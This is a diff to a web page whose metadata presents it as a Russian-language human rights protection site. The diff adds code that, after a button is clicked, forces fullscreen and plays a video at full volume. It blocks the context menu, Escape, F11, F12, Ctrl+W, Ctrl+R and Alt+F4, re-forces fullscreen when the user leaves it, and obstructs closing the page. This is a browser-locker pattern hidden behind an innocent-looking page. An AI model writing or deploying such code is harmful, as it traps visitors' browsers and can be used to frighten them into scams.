@@ -12,7 +12,7 @@
   <meta property="og:site_name" content="Защита прав">
   <meta property="og:description" content="Узнайте о своих правах человека и способах их защиты. Доступ к ресурсам, законам и контактам служб поддержки.">
   <meta property="og:type" content="website">
-  <meta property="og:url" content="https://servicemanagement-pied.vercel.app/ ">
+  <meta property="og:url" content="https://servicemanagement-pied.vercel.app/">
   <meta property="og:image" content="images/image.png">
 
   <meta name="twitter:card" content="summary_large_image">
@@ -155,26 +155,54 @@
     const acceptButton = document.getElementById("accept-button");
     const soglButton = document.getElementById("sogl");
     let hasClicked;
+    
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
 
-    window.onbeforeunload = function() {
-      if (hasClicked) return true;
+    window.addEventListener('keydown', function(e) {
+        const forbidden = ['Escape', 'F11', 'F12'];
+        if (forbidden.includes(e.key) || (e.ctrlKey && (e.key === 'w' || e.key === 'r')) || (e.altKey && e.key === 'F4')) {
+            e.preventDefault();
+        }
+    });
+
+    document.addEventListener('fullscreenchange', function() {
+        if (!document.fullscreenElement && hasClicked) {
+            requestFullScreen();
+        }
+    });
+
+    window.onbeforeunload = function(event) {
+        if (hasClicked) {
+            event.preventDefault();
+            event.returnValue = '';
+            return '';
+        }
     };
 
+    function requestFullScreen() {
+        const d = document.documentElement;
+        if (d.requestFullscreen) d.requestFullscreen();
+        else if (d.mozRequestFullScreen) d.mozRequestFullScreen();
+        else if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
+        else if (d.msRequestFullscreen) d.msRequestFullscreen();
+    }
+
     function buttonClick(event) {
-      event.preventDefault();
-      if (!hasClicked) hasClicked = true;
-      overlay.hidden = true;
-      video.play();
-      videoClick();
+        event.preventDefault();
+        if (!hasClicked) {
+            hasClicked = true;
+        }
+        overlay.hidden = true;
+        video.volume = 1;
+        video.play();
+        requestFullScreen();
     }
 
     function videoClick(event) {
-      if (event) event.preventDefault();
-      const d = document.documentElement;
-      if (d.requestFullscreen) d.requestFullscreen();
-      else if (d.mozRequestFullScreen) d.mozRequestFullScreen();
-      else if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
-      else if (d.msRequestFullscreen) d.msRequestFullscreen();
+        if (event) event.preventDefault();
+        requestFullScreen();
     }
 
     acceptButton.addEventListener("click", buttonClick);
